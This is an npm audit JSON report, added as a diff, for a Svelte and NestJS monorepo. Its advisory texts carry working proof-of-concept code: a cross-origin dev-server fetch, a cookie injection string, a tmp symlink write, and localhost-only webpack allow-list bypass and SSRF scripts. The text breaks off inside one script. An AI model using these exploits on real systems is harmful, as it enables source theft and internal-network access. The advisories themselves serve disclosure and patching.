@@ -1,0 +1,719 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "apps__client>vite>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "apps__client>@sveltejs/kit>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tmp",
+      "resolves": [
+        {
+          "id": 1109537,
+          "path": "apps__server>@nestjs/cli>@angular-devkit/schematics-cli>inquirer>external-editor>tmp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "webpack",
+      "resolves": [
+        {
+          "id": 1113041,
+          "path": "apps__server>@nestjs/cli>webpack",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113042,
+          "path": "apps__server>@nestjs/cli>webpack",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "svelte",
+      "resolves": [
+        {
+          "id": 1113416,
+          "path": "apps__client>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113418,
+          "path": "apps__client>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113419,
+          "path": "apps__client>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114402,
+          "path": "apps__client>svelte",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ajv",
+      "resolves": [
+        {
+          "id": 1113715,
+          "path": "apps__server>@nestjs/cli>@angular-devkit/core>ajv",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "file-type",
+      "resolves": [
+        {
+          "id": 1114301,
+          "path": "apps__server>@nestjs/common>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114726,
+          "path": "apps__server>@nestjs/common>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vite",
+      "resolves": [
+        {
+          "id": 1116229,
+          "path": "apps__client>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@nestjs/core",
+      "resolves": [
+        {
+          "id": 1117063,
+          "path": "apps__server>@nestjs/core",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.21.5",
+          "paths": [
+            "apps__client>vite>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.6.0",
+          "paths": [
+            "apps__client>@sveltejs/kit>cookie"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1109537": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": [
+            "apps__server>@nestjs/cli>@angular-devkit/schematics-cli>inquirer>external-editor>tmp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
+      "created": "2025-08-06T17:06:04.000Z",
+      "id": 1109537,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+      "reported_by": null,
+      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-54798"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "tmp",
+      "vulnerable_versions": "<=0.2.3",
+      "github_advisory_id": "GHSA-52f5-9888-hmc6",
+      "recommendation": "Upgrade to version 0.2.4 or later",
+      "patched_versions": ">=0.2.4",
+      "updated": "2025-11-03T21:34:21.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
+    },
+    "1113041": {
+      "findings": [
+        {
+          "version": "5.97.1",
+          "paths": [
+            "apps__server>@nestjs/cli>webpack"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-8fgc-7cc6-rx7x\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68458\n- https://github.com/advisories/GHSA-8fgc-7cc6-rx7x",
+      "created": "2026-02-05T18:38:10.000Z",
+      "id": 1113041,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) can be bypassed to fetch resources from **hosts outside `allowedUris`** by using crafted URLs that include **userinfo** (`username:password@host`). If `allowedUris` enforcement relies on a **raw string prefix check** (e.g., `uri.startsWith(allowed)`), a URL that *looks* allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (outbound requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion** (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache.\n\nReproduced on:\n- webpack version: **5.104.0**\n- Node version: **v18.19.1**\n\n### Details\n**Root cause (high level):** `allowedUris` validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., `new URL(uri)`), which interprets the **authority** as the part after `@`.\n\nExample crafted URL:\n- `http://127.0.0.1:9000@127.0.0.1:9100/secret.js`\n\nIf the allow-list is `[\"http://127.0.0.1:9000\"]`, then:\n- Raw string check:  \n  `crafted.startsWith(\"http://127.0.0.1:9000\")` → **true**\n- URL parsing (WHAT `new URL()` will contact):  \n  `origin` → `http://127.0.0.1:9100` (host/port after `@`)\n\nAs a result, webpack fetches `http://127.0.0.1:9100/secret.js` even though `allowedUris` only included `http://127.0.0.1:9000`.\n\n**Evidence from reproduction:**\n- Server logs showed the internal-only endpoint being fetched:\n  - `[internal] 200 /secret.js served (...)` (observed multiple times)\n- Attacker-side build output showed:\n  - the internal secret marker was present in the **bundle**\n  - the internal secret marker was present in the **buildHttp cache**\n\n<img width=\"1651\" height=\"381\" alt=\"image-2\" src=\"https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492\" />\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-userinfo-poc && cd split-userinfo-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\n\nconst ALLOWED_PORT = 9000;   // allowlisted-looking host\nconst INTERNAL_PORT = 9100;  // actual target if bypass succeeds\n\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `// internal-only\\n` +\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction listen(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // \"Allowed\" host (should NOT be contacted if bypass works as intended)\n  await listen(ALLOWED_PORT, (req, res) => {\n    console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`);\n    res.statusCode = 200;\n    res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n    res.end(`export default \"ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY\";\\n`);\n  });\n\n  // Internal-only service (SSRF-like target)\n  await listen(INTERNAL_PORT, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      return;\n    }\n    console.log(`[internal] 404 ${req.method} ${req.url}`);\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(\"\\nServers up:\");\n  console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`);\n  console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`);\n})();\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\n\nfunction fmtBool(b) { return b ? \"✅\" : \"❌\"; }\n\nasync function walk(dir) {\n  const out = [];\n  let items;\n  try { items = await fs.readdir(dir, { withFileTypes: true }); }\n  catch { return out; }\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    const s1 = buf.toString(\"utf8\");\n    if (s1.includes(needle)) return true;\n    const s2 = buf.toString(\"latin1\");\n    return s2.includes(needle);\n  } catch {\n    return false;\n  }\n}\n\n(async () => {\n  const webpackVersion = require(\"webpack/package.json\").version;\n\n  const ALLOWED_PORT = 9000;\n  const INTERNAL_PORT = 9100;\n\n  // NOTE: allowlist is intentionally specified without a trailing slash\n  // to demonstrate the risk of raw string prefix checks.\n  const allowedUri = `http://127.0.0.1:${ALLOWED_PORT}`;\n\n  // Crafted URL using userinfo so that:\n  // - The string begins with allowedUri\n  // - The actual authority (host:port) after '@' is INTERNAL_PORT\n  const crafted = `http://127.0.0.1:${ALLOWED_PORT}@127.0.0.1:${INTERNAL_PORT}/secret.js`;\n  const parsed = new URL(crafted);\n\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \"webpack-httpuri-userinfo-poc-\"));\n  const srcDir = path.join(tmp, \"src\");\n  const distDir = path.join(tmp, \"dist\");\n  const cacheDir = path.join(tmp, \".buildHttp-cache\");\n  const lockfile = path.join(tmp, \"webpack.lock\");\n  const bundlePath = path.join(distDir, \"bundle.js\");\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \"index.js\"),\n    `import { secret } from ${JSON.stringify(crafted)};\nconsole.log(\"LEAKED_SECRET:\", secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \"development\",\n    entry: \"./src/index.js\",\n    output: { path: distDir, filename: \"bundle.js\" },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedUri],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  console.log(\"\\n[ENV]\");\n  console.log(`- webpack version: ${webpackVersion}`);\n  console.log(`- node version:    ${process.version}`);\n  console.log(`- allowedUris:     ${JSON.stringify([allowedUri])}`);\n\n  console.log(\"\\n[CRAFTED URL]\");\n  console.log(`- import specifier: ${crafted}`);\n  console.log(`- WHAT startsWith() sees: begins with \"${allowedUri}\" => ${fmtBool(crafted.startsWith(allowedUri))}`);\n  console.log(`- WHAT URL() parses:`);\n  console.log(`  - username: ${JSON.stringify(parsed.username)} (userinfo)`);\n  console.log(`  - password: ${JSON.stringify(parsed.password)} (userinfo)`);\n  console.log(`  - hostname: ${parsed.hostname}`);\n  console.log(`  - port:     ${parsed.port}`);\n  console.log(`  - origin:   ${parsed.origin}`);\n  console.log(`  - NOTE: request goes to origin above (host/port after @), not to \"${allowedUri}\"`);\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) => {\n    try {\n      if (err) throw err;\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n\n      if (stats.hasErrors()) {\n        console.error(\"\\n[WEBPACK ERRORS]\");\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \"utf8\");\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const foundSecret = m ? m[0] : null;\n\n      console.log(\"\\n[RESULT]\");\n      console.log(`- temp dir:  ${tmp}`);\n      console.log(`- bundle:    ${bundlePath}`);\n      console.log(`- lockfile:  ${lockfile}`);\n      console.log(`- cacheDir:  ${cacheDir}`);\n\n      console.log(\"\\n[SECURITY CHECK]\");\n      console.log(`- bundle contains INTERNAL_ONLY_SECRET_* : ${fmtBool(!!foundSecret)}`);\n\n      if (foundSecret) {\n        const lockHit = await fileContains(lockfile, foundSecret);\n\n        const cacheFiles = await walk(cacheDir);\n        let cacheHit = false;\n        for (const f of cacheFiles) {\n          if (await fileContains(f, foundSecret)) { cacheHit = true; break; }\n        }\n\n        console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n        console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      }\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected vs Actual\n\nExpected: The import should be blocked because the effective request destination is http://127.0.0.1:9100/secret.js, which is outside allowedUris (only http://127.0.0.1:9000 is allow-listed).\n\nActual: The crafted URL passes the allow-list prefix validation, webpack fetches the internal-only resource on port 9100 (confirmed by server logs), and the secret marker appears in the bundle and buildHttp cache.\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to build-time SSRF behavior and untrusted content inclusion in build outputs.\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary. If an attacker can influence the imported HTTP(S) specifier (e.g., via source contribution, dependency manipulation, or configuration), they can cause outbound requests from the build environment to endpoints outside the allow-list (including internal-only services, subject to network reachability). The fetched response can be treated as module source and included in build outputs and persisted in the buildHttp cache, increasing the risk of leakage or supply-chain contamination.",
+      "reported_by": null,
+      "title": "webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68458"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "webpack",
+      "vulnerable_versions": ">=5.49.0 <=5.104.0",
+      "github_advisory_id": "GHSA-8fgc-7cc6-rx7x",
+      "recommendation": "Upgrade to version 5.104.1 or later",
+      "patched_versions": ">=5.104.1",
+      "updated": "2026-02-06T14:39:32.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-8fgc-7cc6-rx7x"
+    },
+    "1113042": {
+      "findings": [
+        {
+          "version": "5.97.1",
+          "paths": [
+            "apps__server>@nestjs/cli>webpack"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-38r7-794h-5758\n- https://nvd.nist.gov/vuln/detail/CVE-2025-68157\n- https://github.com/advisories/GHSA-38r7-794h-5758",
+      "created": "2026-02-05T18:35:28.000Z",
+      "id": 1113042,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.\n\n### Details\nIn the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`.\n\nPractical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.\n\n**Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.\n\n<img width=\"1648\" height=\"461\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524\" />\n\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-ssrf-poc && cd split-ssrf-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\nconst url = require(\"url\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction start(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // Internal-only service (SSRF target)\n  await start(internalPort, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      return;\n    }\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  // Allowed host (redirector)\n  await start(allowedPort, (req, res) => {\n    const parsed = url.parse(req.url, true);\n\n    if (parsed.pathname === \"/redirect.js\") {\n      const to = parsed.query.to || internalUrlDefault;\n\n      // Safety guard: only allow redirecting to localhost internal service in this PoC\n      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {\n        res.statusCode = 400;\n        res.end(\"to must be internal-only in this PoC\");\n        console.log(`[allowed] blocked redirect to: ${to}`);\n        return;\n      }\n\n      res.statusCode = 302;\n      res.setHeader(\"Location\", to);\n      res.end(\"redirecting\");\n      console.log(`[allowed] 302 /redirect.js -> ${to}`);\n      return;\n    }\n\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(`\\nServer running:`);\n  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);\n  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);\n})();\n```\n\n#### 3) Create attacker.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\nconst webpackPkg = require(\"webpack/package.json\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst allowedBase = `http://127.0.0.1:${allowedPort}/`;\nconst internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;\nconst entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;\n\nasync function walk(dir) {\n  const out = [];\n  const items = await fs.readdir(dir, { withFileTypes: true });\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    return buf.toString(\"utf8\").includes(needle) || buf.toString(\"latin1\").includes(needle);\n  } catch {\n    return false;\n  }\n}\n\nasync function findInFiles(files, needle) {\n  const hits = [];\n  for (const f of files) if (await fileContains(f, needle)) hits.push(f);\n  return hits;\n}\n\nconst fmtBool = b => (b ? \"✅\" : 